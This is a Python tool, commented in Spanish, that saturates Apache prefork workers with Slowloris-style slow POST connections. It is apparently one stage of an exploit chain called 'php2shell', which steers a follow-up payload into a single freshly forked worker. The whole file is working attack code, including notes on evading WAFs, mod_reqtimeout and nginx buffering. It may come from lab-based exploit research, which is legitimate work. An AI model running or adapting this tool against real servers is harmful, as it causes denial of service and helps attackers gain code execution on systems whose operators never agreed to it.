"""
hold.py — saturador de workers para fase A de php2shell.

Abre N-1 conexiones HTTP con un cuerpo de Content-Length grande pero
enviando solo los primeros bytes, ocupando N-1 workers de Apache/prefork
sin cerrar la conexion. El worker libre queda disponible para que el
exploit (payload A seguido de B) caiga siempre en el mismo hijo
recien forkeado.

Uso:
    python3 hold.py <url> <n_workers> [--timeout 30]

    url          Destino. Puede ser directo a Apache o a traves de proxy.
    n_workers    Numero de workers de Apache (MaxRequestWorkers).
                 El script abre n_workers-1 conexiones lentas.
    --timeout    Tiempo en segundos que mantiene las conexiones abiertas
                 antes de soltarlas (default: 30).

Ejemplo (4 workers, directo):
    python3 hold.py http://127.0.0.1:18089/index.php 4

Ejemplo (8 workers, con proxy nginx en 18090):
    python3 hold.py http://127.0.0.1:18090/index.php 8

Mecanismo:
    Cada conexion envía:
        POST /index.php HTTP/1.1
        Content-Length: 134217728   (128 MB)
        <solo se transmiten 4 bytes del body>
    Apache recibe la peticion, asigna un worker y espera el cuerpo.
    El worker queda bloqueado en lectura hasta que la conexion se cierra
    o Apache la corta por RequestReadTimeout.

Limitaciones documentadas (ver 07-plan/progress-02.md y progress-04.md):
    1. Slowloris: detectable por WAF/IDS que limiten conexiones lentas.
    2. Requiere conocer o estimar MaxRequestWorkers.
    3. A traves de nginx con proxy_request_buffering on (default), nginx
       puede absorber el body y liberar el worker de Apache antes de que
       el exploit llegue. Usar proxy_request_buffering off en ese caso.
    4. mod_reqtimeout puede cortar el holder. Con RequestReadTimeout
       body=20,MinRate=500 Apache exige 500 B/s sostenidos: enviar 1 B cada
       10 s NO satisface el minrate, lo incumple, y el corte llega al vencer
       el plazo. El trickle solo sirve contra timeouts de inactividad (por
       ejemplo nginx client_body_timeout). Si el objetivo aplica MinRate hay
       que subir el ritmo o desactivar mod_reqtimeout en el laboratorio.
"""

import argparse
import socket
import threading
import time
import urllib.parse
from typing import List


# ---------------------------------------------------------------------------
# Configuracion de la peticion lenta
# ---------------------------------------------------------------------------

_FAKE_BODY_SIZE = 128 * 1024 * 1024   # Content-Length declarado (128 MB)
_INITIAL_BYTES  = 4                    # bytes que se envian al inicio
_KEEPALIVE_BYTE = b"\x00"             # byte periodico para engañar el minrate
_KEEPALIVE_INTERVAL = 10              # segundos entre bytes periodicos


def _build_slow_request(host: str, path: str) -> bytes:
    """Construye la linea de inicio y cabeceras de la peticion lenta."""
    headers = (
        f"POST {path} HTTP/1.1\r\n"
        f"Host: {host}\r\n"
        f"Content-Type: application/octet-stream\r\n"
        f"Content-Length: {_FAKE_BODY_SIZE}\r\n"
        f"Connection: keep-alive\r\n"
        f"\r\n"
    )
    return headers.encode() + _KEEPALIVE_BYTE * _INITIAL_BYTES


def _parse_url(url: str):
    """Devuelve (host, port, path) desde una URL HTTP."""
    p = urllib.parse.urlparse(url)
    host = p.hostname
    port = p.port or (443 if p.scheme == "https" else 80)
    path = p.path or "/"
    if p.query:
        path += "?" + p.query
    return host, port, path


# ---------------------------------------------------------------------------
# Worker individual
# ---------------------------------------------------------------------------

class _HolderThread(threading.Thread):
    """Un hilo = una conexion lenta que ocupa un worker de Apache."""

    def __init__(self, idx: int, host: str, port: int, path: str,
                 stop_event: threading.Event, timeout: float):
        super().__init__(daemon=True, name=f"holder-{idx}")
        self.idx        = idx
        self.host       = host
        self.port       = port
        self.path       = path
        self.stop_event = stop_event
        self.timeout    = timeout
        self.connected  = threading.Event()
        self.error: str = ""

    def run(self):
        try:
            sock = socket.create_connection((self.host, self.port), timeout=10)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            req = _build_slow_request(self.host, self.path)
            sock.sendall(req)
            self.connected.set()

            deadline = time.monotonic() + self.timeout
            while not self.stop_event.is_set():
                remaining = deadline - time.monotonic()
                if remaining <= 0:
                    break
                wait = min(_KEEPALIVE_INTERVAL, remaining)
                if self.stop_event.wait(timeout=wait):
                    break
                try:
                    sock.send(_KEEPALIVE_BYTE)
                except OSError:
                    break
        except Exception as exc:
            self.error = str(exc)
            self.connected.set()   # desbloquea al que espera
        finally:
            try:
                sock.shutdown(socket.SHUT_RDWR)
                sock.close()
            except Exception:
                pass


# ---------------------------------------------------------------------------
# API publica
# ---------------------------------------------------------------------------

class WorkerSaturator:
    """
    Abre n_holders conexiones lentas y las mantiene hasta que se llame
    a release() o expire el timeout.

    with WorkerSaturator(url, n_workers=4, timeout=30) as sat:
        # aqui el exploit envia A y B; los N-1 holders estan activos
        run_exploit()
    # al salir del bloque las conexiones se cierran
    """

    def __init__(self, url: str, n_workers: int, timeout: float = 30.0):
        if n_workers < 2:
            raise ValueError("n_workers debe ser >= 2")
        self.url       = url
        self.n_holders = n_workers - 1
        self.timeout   = timeout
        host, port, path = _parse_url(url)
        self._host  = host
        self._port  = port
        self._path  = path
        self._stop  = threading.Event()
        self._threads: List[_HolderThread] = []

    def __enter__(self):
        self.acquire()
        return self

    def __exit__(self, *_):
        self.release()

    def acquire(self):
        """Lanza los hilos y bloquea hasta que todos hayan enviado el header."""
        self._stop.clear()
        self._threads = []
        for i in range(self.n_holders):
            t = _HolderThread(
                idx=i,
                host=self._host,
                port=self._port,
                path=self._path,
                stop_event=self._stop,
                timeout=self.timeout,
            )
            self._threads.append(t)
            t.start()

        for t in self._threads:
            t.connected.wait(timeout=15)
            if t.error:
                print(f"[hold] holder-{t.idx} error: {t.error}")

        active = sum(1 for t in self._threads if not t.error)
        print(f"[hold] {active}/{self.n_holders} holders activos")

    def release(self):
        """Cierra todas las conexiones lentas."""
        self._stop.set()
        for t in self._threads:
            t.join(timeout=5)
        print("[hold] holders liberados")


# ---------------------------------------------------------------------------
# CLI standalone (verificacion rapida)
# ---------------------------------------------------------------------------

def _cli():
    ap = argparse.ArgumentParser(description="Saturador de workers php2shell")
    ap.add_argument("url", help="URL del objetivo (http://host:port/path)")
    ap.add_argument("n_workers", type=int,
                    help="MaxRequestWorkers de Apache")
    ap.add_argument("--timeout", type=float, default=30.0,
                    help="Segundos que se mantienen los holders (default: 30)")
    args = ap.parse_args()

    print(f"[hold] saturando {args.n_workers - 1} workers en {args.url}")
    print(f"[hold] timeout: {args.timeout}s — Ctrl+C para soltar")

    with WorkerSaturator(args.url, args.n_workers, args.timeout):
        try:
            time.sleep(args.timeout)
        except KeyboardInterrupt:
            print("\n[hold] interrupcion manual")


if __name__ == "__main__":
    _cli()
